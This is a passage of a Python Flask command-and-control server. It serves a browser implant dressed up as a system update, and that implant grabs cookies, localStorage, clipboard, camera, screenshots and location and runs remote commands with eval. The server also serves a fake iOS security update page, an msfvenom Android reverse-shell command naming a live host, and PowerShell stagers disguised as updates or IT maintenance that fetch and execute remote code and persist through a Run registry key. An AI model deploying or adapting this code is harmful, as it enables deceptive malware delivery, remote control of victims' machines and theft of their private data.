                } catch (e) {}
                return 'unavailable';
            }
            
            getCanvasFingerprint() {
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = 'top';
                    ctx.font = '14px Arial';
                    ctx.fillText('Universal C2 Fingerprint 🌐', 2, 2);
                    return canvas.toDataURL();
                } catch (e) {
                    return 'unavailable';
                }
            }
            
            async sendInitialBeacon() {
                try {
                    const response = await fetch(`${this.server}/b`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            h: this.sessionId,
                            u: 'web-user',
                            a: false,
                            os: `${this.os} (Web Browser)`
                        })
                    });
                    
                    const data = await response.json();
                    return data;
                } catch (e) {
                    console.error('Beacon failed:', e);
                }
            }
            
            async sendSystemFingerprint() {
                try {
                    await fetch(`${this.server}/exfil`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            h: this.sessionId,
                            type: 'web_fingerprint',
                            data: JSON.stringify(this.systemInfo),
                            timestamp: new Date().toISOString()
                        })
                    });
                } catch (e) {}
            }
            
            async startCommandLoop() {
                setInterval(async () => {
                    try {
                        const response = await fetch(`${this.server}/b`, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                h: this.sessionId,
                                u: 'web-user',
                                a: false,
                                os: `${this.os} (Web Browser)`
                            })
                        });
                        
                        const data = await response.json();
                        const commands = data.c || [];
                        
                        for (const cmd of commands) {
                            await this.executeWebCommand(cmd);
                        }
                    } catch (e) {
                        console.error('Command loop error:', e);
                    }
                }, 30000); // Every 30 seconds
            }
            
            async executeWebCommand(command) {
                let output = '';
                
                try {
                    // Web-based command execution
                    switch(command.toLowerCase()) {
                        case 'whoami':
                            output = `web-user@${this.sessionId}`;
                            break;
                            
                        case 'hostname':
                            output = this.sessionId;
                            break;
                            
                        case 'systeminfo':
                            output = JSON.stringify(this.systemInfo, null, 2);
                            break;
                            
                        case 'screenshot':
                            output = await this.takeScreenshot();
                            break;
                            
                        case 'camera':
                            output = await this.accessCamera();
                            break;
                            
                        case 'location':
                            output = await this.getLocation();
                            break;
                            
                        case 'cookies':
                            output = this.getCookies();
                            break;
                            
                        case 'localstorage':
                            output = this.getLocalStorage();
                            break;
                            
                        case 'history':
                            output = 'Browser history access restricted by same-origin policy';
                            break;
                            
                        case 'clipboard':
                            output = await this.getClipboard();
                            break;
                            
                        default:
                            if (command.startsWith('eval:')) {
                                // JavaScript evaluation (dangerous!)
                                try {
                                    const jsCode = command.substring(5);
                                    const result = eval(jsCode);
                                    output = String(result);
                                } catch (e) {
                                    output = `JavaScript Error: ${e.message}`;
                                }
                            } else {
                                output = `Unknown web command: ${command}`;
                            }
                    }
                } catch (e) {
                    output = `Error executing command: ${e.message}`;
                }
                
                // Send result back
                try {
                    await fetch(`${this.server}/r`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            h: this.sessionId,
                            c: command,
                            o: output,
                            t: 0,
                            s: true
                        })
                    });
                } catch (e) {}
            }
            
            async takeScreenshot() {
                try {
                    const stream = await navigator.mediaDevices.getDisplayMedia({video: true});
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    return new Promise((resolve) => {
                        video.addEventListener('loadedmetadata', () => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0);
                            
                            const screenshot = canvas.toDataURL('image/jpeg', 0.8);
                            stream.getTracks().forEach(track => track.stop());
                            resolve(screenshot);
                        });
                    });
                } catch (e) {
                    return `Screenshot failed: ${e.message}`;
                }
            }
            
            async accessCamera() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({video: true});
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    return new Promise((resolve) => {
                        video.addEventListener('loadedmetadata', () => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0);
                            
                            const photo = canvas.toDataURL('image/jpeg', 0.8);
                            stream.getTracks().forEach(track => track.stop());
                            resolve(photo);
                        });
                    });
                } catch (e) {
                    return `Camera access failed: ${e.message}`;
                }
            }
            
            async getLocation() {
                return new Promise((resolve) => {
                    if ('geolocation' in navigator) {
                        navigator.geolocation.getCurrentPosition(
                            position => {
                                resolve(`Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`);
                            },
                            error => {
                                resolve(`Location error: ${error.message}`);
                            }
                        );
                    } else {
                        resolve('Geolocation not supported');
                    }
                });
            }
            
            getCookies() {
                return document.cookie || 'No cookies found';
            }
            
            getLocalStorage() {
                try {
                    const storage = {};
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        storage[key] = localStorage.getItem(key);
                    }
                    return JSON.stringify(storage, null, 2);
                } catch (e) {
                    return `LocalStorage access failed: ${e.message}`;
                }
            }
            
            async getClipboard() {
                try {
                    if ('clipboard' in navigator) {
                        const text = await navigator.clipboard.readText();
                        return text || 'Clipboard is empty';
                    } else {
                        return 'Clipboard API not supported';
                    }
                } catch (e) {
                    return `Clipboard access denied: ${e.message}`;
                }
            }
            
            setupPersistence() {
                // Service Worker for background execution
                if ('serviceWorker' in navigator) {
                    navigator.serviceWorker.register('/sw.js').catch(() => {});
                }
                
                // LocalStorage persistence
                localStorage.setItem('system_update_client', this.server);
                
                // Try to run in background tab
                document.addEventListener('visibilitychange', () => {
                    if (document.hidden) {
                        // Page is hidden, continue running
                        this.backgroundMode = true;
                    } else {
                        this.backgroundMode = false;
                    }
                });
                
                // Try to prevent page close
                window.addEventListener('beforeunload', (e) => {
                    e.preventDefault();
                    e.returnValue = '';
                });
            }
            
            updateUI() {
                const statusText = document.getElementById('statusText');
                const systemInfo = document.getElementById('systemInfo');
                const progressBar = document.getElementById('progressBar');
                const detailsText = document.getElementById('detailsText');
                
                // Simulate update process
                const steps = [
                    'Analyzing system configuration...',
                    'Checking security patches...',
                    'Optimizing system performance...',
                    'Installing updates...',
                    'Finalizing configuration...',
                    'Update completed successfully!'
                ];
                
                let currentStep = 0;
                const updateInterval = setInterval(() => {
                    if (currentStep < steps.length) {
                        statusText.textContent = steps[currentStep];
                        progressBar.style.width = `${(currentStep + 1) * (100 / steps.length)}%`;
                        
                        if (currentStep === steps.length - 1) {
                            setTimeout(() => {
                                window.close();
                            }, 2000);
                        }
                        
                        currentStep++;
                    } else {
                        clearInterval(updateInterval);
                    }
                }, 2000);
                
                // Update system info
                systemInfo.innerHTML = `
                    🖥️ OS: ${this.os}<br>
                    🌐 Browser: ${navigator.userAgent.split(' ').pop()}<br>
                    📱 Device: ${navigator.platform}
                `;
                
                detailsText.textContent = 'System optimization in progress...';
                
                // Send fingerprint after UI setup
                setTimeout(() => {
                    this.sendSystemFingerprint();
                }, 1000);
            }
        }
        
        // Initialize Universal C2
        const c2 = new UniversalC2();
    </script>
</body>
</html>
    '''
    
    return html

# =============================================================================
# iOS WEB ENDPOINT (Limited but possible)
# =============================================================================

@app.route('/ios')
def ios_web():
    """iOS-specific web interface"""
    html = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>📱 iOS Security Update</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
            margin: 0; padding: 20px; background: #f2f2f7; color: #000;
        }
        .container { max-width: 375px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 30px; }
        .logo { font-size: 60px; margin-bottom: 10px; }
        .card { 
            background: white; border-radius: 12px; padding: 20px; 
            margin: 15px 0; box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .button { 
            background: #007AFF; color: white; padding: 15px; 
            border-radius: 10px; text-align: center; cursor: pointer;
            margin: 10px 0; text-decoration: none; display: block;
        }
        .button:active { background: #0056CC; }
        .warning { color: #FF3B30; font-size: 14px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">🍎</div>
            <h1>iOS Security Update</h1>
            <p>Critical security patches available</p>
        </div>
        
        <div class="card">
            <h3>📱 Device Information</h3>
            <div id="deviceInfo">
                <p>Model: <span id="device">Detecting...</span></p>
                <p>iOS Version: <span id="version">Checking...</span></p>
                <p>Security Level: <span style="color: #FF3B30;">Vulnerable</span></p>
            </div>
        </div>
        
        <div class="card">
            <h3>🔒 Security Updates</h3>
            <p>• CVE-2024-Security-Patch</p>
            <p>• WebKit Memory Fix</p>
            <p>• Safari Security Enhancement</p>
        </div>
        
        <a href="#" class="button" onclick="installUpdate()">
            📥 Install Security Update
        </a>
        
        <a href="itms-services://?action=download-manifest&url=https://hitrunc2server-production.up.railway.app/ios-manifest.plist" class="button">
            📲 Enterprise Installation
        </a>
        
        <div class="warning">
            ⚠️ This update requires iOS 12.0 or later
        </div>
    </div>
    
    <script>
        // iOS-specific fingerprinting
        function detectiOSInfo() {
            const ua = navigator.userAgent;
            const device = /iPhone|iPad|iPod/.test(ua) ? 
                ua.match(/(iPhone|iPad|iPod)/)[1] : 'iOS Device';
            
            const versionMatch = ua.match(/OS (\d+)_(\d+)_?(\d+)?/);
            const version = versionMatch ? 
                `${versionMatch[1]}.${versionMatch[2]}.${versionMatch[3] || 0}` : 'Unknown';
            
            document.getElementById('device').textContent = device;
            document.getElementById('version').textContent = version;
            
            // Send iOS fingerprint
            const fingerprint = {
                device: device,
                version: version,
                userAgent: ua,
                screen: `${screen.width}x${screen.height}`,
                pixelRatio: window.devicePixelRatio,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                standalone: window.navigator.standalone
            };
            
            fetch('/device-fingerprint', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    type: 'ios_visit',
                    info: fingerprint,
                    timestamp: new Date().toISOString()
                })
            });
        }
        
        function installUpdate() {
            // iOS Web-based "installation"
            alert('📱 Opening Settings app...');
            
            // Try to open Settings (limited success)
            window.location.href = 'prefs:root=General&path=SOFTWARE_UPDATE_LINK';
            
            // Fallback: collect more data
            setTimeout(() => {
                if ('devicemotion' in window) {
                    window.addEventListener('devicemotion', function(e) {
                        // Collect device motion data
                        const motion = {
                            acceleration: e.acceleration,
                            rotationRate: e.rotationRate,
                            interval: e.interval
                        };
                        
                        fetch('/device-fingerprint', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                type: 'ios_motion',
                                data: motion
                            })
                        });
                    }, {once: true});
                }
            }, 1000);
        }
        
        // Initialize
        detectiOSInfo();
        
        // Try to add to home screen
        if (window.navigator.standalone === false) {
            // Show add to home screen prompt
            const addToHome = document.createElement('div');
            addToHome.innerHTML = `
                <div style="position: fixed; bottom: 0; left: 0; right: 0; background: #007AFF; color: white; padding: 15px; text-align: center;">
                    📱 Add to Home Screen for better experience
                    <button onclick="this.parentElement.style.display='none'" style="background: none; border: none; color: white; float: right;">✕</button>
                </div>
            `;
            document.body.appendChild(addToHome);
        }
    </script>
</body>
</html>
    '''
    return html

# =============================================================================
# DEVICE FINGERPRINTING ENDPOINT
# =============================================================================

@app.route('/device-fingerprint', methods=['POST'])
def device_fingerprint():
    """Collect device fingerprints from all platforms"""
    try:
        data = request.get_json()
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', '')
        
        fingerprint_data = {
            'ip': client_ip,
            'user_agent': user_agent,
            'timestamp': datetime.datetime.now().isoformat(),
            'fingerprint': data
        }
        
        # Store in database
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                # Create fingerprints table if not exists
                conn.execute('''
                    CREATE TABLE IF NOT EXISTS device_fingerprints (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        ip_address TEXT,
                        user_agent TEXT,
                        fingerprint_data TEXT,
                        platform TEXT,
                        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    )
                ''')
                
                # Detect platform
                platform = 'unknown'
                if 'ios' in data.get('type', ''):
                    platform = 'iOS'
                elif 'android' in data.get('type', ''):
                    platform = 'Android'
                elif 'Windows' in user_agent:
                    platform = 'Windows'
                elif 'Mac' in user_agent:
                    platform = 'macOS'
                elif 'Linux' in user_agent:
                    platform = 'Linux'
                
                conn.execute('''
                    INSERT INTO device_fingerprints (ip_address, user_agent, fingerprint_data, platform)
                    VALUES (?, ?, ?, ?)
                ''', (client_ip, user_agent, json.dumps(fingerprint_data), platform))
        
        print(f"[FINGERPRINT] {platform} device from {client_ip}")
        
        return jsonify({'status': 'received'})
        
    except Exception as e:
        print(f"Fingerprint error: {e}")
        return jsonify({'error': str(e)}), 500

# =============================================================================
# APK DOWNLOAD ENDPOINT (Android)
# =============================================================================

@app.route('/download/android-security-update.apk')
def download_android_apk():
    """Serve Android APK (placeholder - create real APK with msfvenom)"""
    
    # In real implementation, serve actual APK created with:
    # msfvenom -p android/meterpreter/reverse_tcp LHOST=your-ip LPORT=4444 -o payload.apk
    
    return jsonify({
        'error': 'APK not available',
        'message': 'Create APK with: msfvenom -p android/meterpreter/reverse_tcp LHOST=hitrunc2server-production.up.railway.app LPORT=443 -o android-update.apk'
    })

# =============================================================================
# SERVICE WORKER FOR WEB PERSISTENCE
# =============================================================================

@app.route('/sw.js')
def service_worker():
    """Service Worker for web persistence"""
    js_code = '''
// Service Worker for Universal C2 Persistence

const CACHE_NAME = 'system-update-v1';
const urlsToCache = [
    '/universal',
    '/offline.html'
];

self.addEventListener('install', event => {
    event.waitUntil(
        caches.open(CACHE_NAME)
            .then(cache => cache.addAll(urlsToCache))
    );
});

self.addEventListener('fetch', event => {
    event.respondWith(
        caches.match(event.request)
            .then(response => {
                return response || fetch(event.request);
            })
    );
});

// Background sync for command execution
self.addEventListener('sync', event => {
    if (event.tag === 'background-sync') {
        event.waitUntil(
            // Execute commands in background
            fetch('/universal').catch(() => {})
        );
    }
});

// Push notifications for command delivery
self.addEventListener('push', event => {
    if (event.data) {
        const command = event.data.text();
        
        // Execute command in background
        event.waitUntil(
            executeBackgroundCommand(command)
        );
    }
});

async function executeBackgroundCommand(command) {
    try {
        // Execute web command in background
        const response = await fetch('/api/web-execute', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({command: command})
        });
        
        const result = await response.json();
        
        // Send result back
        await fetch('/r', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                h: 'web-worker',
                c: command,
                o: result.output || 'executed',
                t: 0,
                s: true
            })
        });
    } catch (e) {
        console.error('Background command failed:', e);
    }
}
    '''
    
    return Response(js_code, mimetype='application/javascript')

# =============================================================================
# PLATFORM STATISTICS ENDPOINT
# =============================================================================

@app.route('/api/platform-stats')
def platform_statistics():
    """Get statistics by platform"""
    try:
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                # Platform distribution from sessions
                platform_cursor = conn.execute('''
                    SELECT 
                        CASE 
                            WHEN os_info LIKE '%Windows%' THEN 'Windows'
                            WHEN os_info LIKE '%Mac%' OR os_info LIKE '%Darwin%' THEN 'macOS'
                            WHEN os_info LIKE '%Linux%' AND os_info NOT LIKE '%Android%' THEN 'Linux'
                            WHEN os_info LIKE '%Android%' THEN 'Android'
                            WHEN os_info LIKE '%iOS%' OR os_info LIKE '%iPhone%' THEN 'iOS'
                            ELSE 'Other'
                        END as platform,
                        COUNT(*) as count
                    FROM sessions 
                    GROUP BY platform
                ''')
                
                platforms = {}
                for row in platform_cursor.fetchall():
                    platforms[row[0]] = row[1]
                
                # Fingerprint statistics
                fingerprint_cursor = conn.execute('''
                    SELECT platform, COUNT(*) as count
                    FROM device_fingerprints
                    GROUP BY platform
                ''')
                
                fingerprints = {}
                for row in fingerprint_cursor.fetchall():
                    fingerprints[row[0]] = row[1]
                
                return jsonify({
                    'session_platforms': platforms,
                    'fingerprint_platforms': fingerprints,
                    'total_sessions': sum(platforms.values()),
                    'total_fingerprints': sum(fingerprints.values())
                })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500
@app.route('/ps1')
def get_powershell_payload():
    """PowerShell payload endpoint"""
    base_url = request.url_root.rstrip('/')
    payload = f'''
$s='{base_url}';
$h=$env:COMPUTERNAME;
$u=$env:USERNAME;
$p="$env:APPDATA\\SecurityUpdate.ps1";

# Main C2 loop
$c = @'
while(1) {{
    try {{
        $d = @{{
            h = $h;
            u = $u;
            a = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator");
            os = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        }};
        
        $r = Invoke-RestMethod $s/b -Method POST -Body ($d | ConvertTo-Json) -ContentType "application/json";
        
        $r.c | ForEach-Object {{
            if ($_) {{
                $o = Invoke-Expression $_ 2>&1 | Out-String;
                Invoke-RestMethod $s/r -Method POST -Body (@{{
                    h = $h;
                    c = $_;
                    o = $o;
                    t = 0;
                    s = $true
                }} | ConvertTo-Json) -ContentType "application/json" | Out-Null;
            }}
        }}
    }} catch {{
        Start-Sleep 30;
    }}
}}
'@;

# Persistence
$c | Out-File $p -Force;
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityUpdate /d "powershell -w hidden -f $p" /f | Out-Null;

# Execute immediately
Invoke-Expression $c;
'''
    return payload, 200, {'Content-Type': 'text/plain'}

@app.route('/dl.txt')
def download_batch():
    """Batch file for certutil download method"""
    base_url = request.url_root.rstrip('/')
    batch_content = f'''@echo off
powershell -WindowStyle Hidden -Command "irm {base_url}/exec | iex"
del "%~f0"
'''
    return batch_content, 200, {'Content-Type': 'text/plain'}

@app.route('/exec')
def execute_payload():
    """Direct execution payload"""
    base_url = request.url_root.rstrip('/')
    payload = f'''
# Quick execution payload
$server = '{base_url}';
$hostname = $env:COMPUTERNAME;
$username = $env:USERNAME;

# Check admin status
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator");

# Get OS info
$osInfo = (Get-WmiObject -Class Win32_OperatingSystem).Caption;

# Beacon to server
$data = @{{
    h = $hostname;
    u = $username;
    a = $isAdmin;
    os = $osInfo
}} | ConvertTo-Json;

try {{
    $response = Invoke-RestMethod "$server/b" -Method POST -Body $data -ContentType "application/json";
    
    # Execute any pending commands
    $response.c | ForEach-Object {{
        if ($_) {{
            $output = Invoke-Expression $_ 2>&1 | Out-String;
            $resultData = @{{
                h = $hostname;
                c = $_;
                o = $output;
                t = 0;
                s = $true
            }} | ConvertTo-Json;
            
            Invoke-RestMethod "$server/r" -Method POST -Body $resultData -ContentType "application/json" | Out-Null;
        }}
    }}
}} catch {{
    # Silent fail
}}
'''
    return payload, 200, {'Content-Type': 'text/plain'}

@app.route('/install')
def quick_install():
    """Quick installer payload for Flipper Zero constraints"""
    base_url = request.url_root.rstrip('/')
    payload = f'''irm {base_url}/ps1|iex'''
    return payload, 200, {'Content-Type': 'text/plain'}

@app.route('/update')
def system_update():
    """Payload disguised as system update"""
    base_url = request.url_root.rstrip('/')
    payload = f'''
# Windows Security Update Service
Write-Host "Checking for security updates..." -ForegroundColor Green;
Start-Sleep 2;

# Download and execute main payload
irm {base_url}/ps1 | iex;

Write-Host "Security updates installed successfully." -ForegroundColor Green;
'''
    return payload, 200, {'Content-Type': 'text/plain'}

@app.route('/maintenance')
def it_maintenance():
    """IT maintenance themed payload"""
    base_url = request.url_root.rstrip('/')
    payload = f'''
# IT System Maintenance Script
$logFile = "$env:TEMP\\maintenance_$(Get-Date -Format 'yyyyMMdd').log";
"IT Maintenance started at $(Get-Date)" | Out-File $logFile;

# System health check (actually C2 payload)
irm {base_url}/ps1 | iex;

"IT Maintenance completed at $(Get-Date)" | Out-File $logFile -Append;
'''
    return payload, 200, {'Content-Type': 'text/plain'}

@app.route('/analyze')
def system_analysis():
    """System analysis themed payload"""
    base_url = request.url_root.rstrip('/')
    payload = f'''
# System Analysis Tool
Write-Host "Analyzing system configuration..." -ForegroundColor Cyan;
Write-Host "Collecting system information..." -ForegroundColor Cyan;

# Analysis (actually C2 payload)
irm {base_url}/ps1 | iex;

Write-Host "Analysis complete. Results saved to system logs." -ForegroundColor Green;
'''
    return payload, 200, {'Content-Type': 'text/plain'}

@app.route('/softwareupdate')
def software_update():
    """Software update themed payload"""
    base_url = request.url_root.rstrip('/')
    payload = f'''
# Software Update Manager
Write-Host "Checking for available updates..." -ForegroundColor Yellow;
Start-Sleep 1;
Write-Host "Downloading updates..." -ForegroundColor Yellow;

# Update process (actually C2 payload)
irm {base_url}/ps1 | iex;

Write-Host "Updates installed successfully. Please restart your computer." -ForegroundColor Green;
'''
    return payload, 200, {'Content-Type': 'text/plain'}

@app.route('/stage1')
def stage1_loader():
    """Multi-stage payload - Stage 1"""
    base_url = request.url_root.rstrip('/')
    payload = f'''
# Stage 1 Loader
$stage2 = irm {base_url}/stage2;
if ($stage2) {{
    iex $stage2;
}}
'''
    return payload, 200, {'Content-Type': 'text/plain'}

@app.route('/stage2')
def stage2_payload():
    """Multi-stage payload - Stage 2"""
    base_url = request.url_root.rstrip('/')
    payload = f'''
# Stage 2 - Full payload deployment
irm {base_url}/ps1 | iex;
'''
    return payload, 200, {'Content-Type': 'text/plain'}

# =============================================================================
# ERROR HANDLERS
# =============================================================================

@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Endpoint not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({'error': 'Internal server error'}), 500

# =============================================================================
# MAIN APPLICATION STARTUP
# =============================================================================

if __name__ == '__main__':
    # Initialize database
    init_database()
    
    # Get port from environment (Railway sets this)
    port = int(os.environ.get('PORT', 5000))
    
    print("🚀 Railway C2 Server Starting...")
    print(f"🌍 Server will be available at: https://your-app.railway.app")
    print(f"📊 Dashboard: https://your-app.railway.app")
    print(f"📡 API Endpoint: https://your-app.railway.app/b")
    print("=" * 60)
    
    # Run with gunicorn in production, Flask dev server locally
    if os.environ.get('RAILWAY_ENVIRONMENT'):
        # Production mode on Railway
        app.run(host='0.0.0.0', port=port, debug=False)
    else:
        # Development mode
        app.run(host='0.0.0.0', port=port, debug=True)
